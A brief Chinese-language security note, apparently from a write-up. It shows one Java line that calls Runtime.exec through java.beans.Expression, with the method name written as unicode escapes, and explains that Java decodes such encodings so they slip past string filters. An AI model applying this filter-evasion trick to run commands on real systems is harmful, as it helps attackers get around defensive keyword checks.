![image-20220111094914373](https://img.dem0dem0.top/images/image-20220111094914373.png)

```java
Expression expression = new Expression(Runtime.getRuntime(), "\u0065" + "\u0078" + "\u0065" + "\u0063", new Object[]{payload});
```

java对于字符串会自动转换编码哦，所以什么unicode，hex，utf-16这些都可以直接使用的。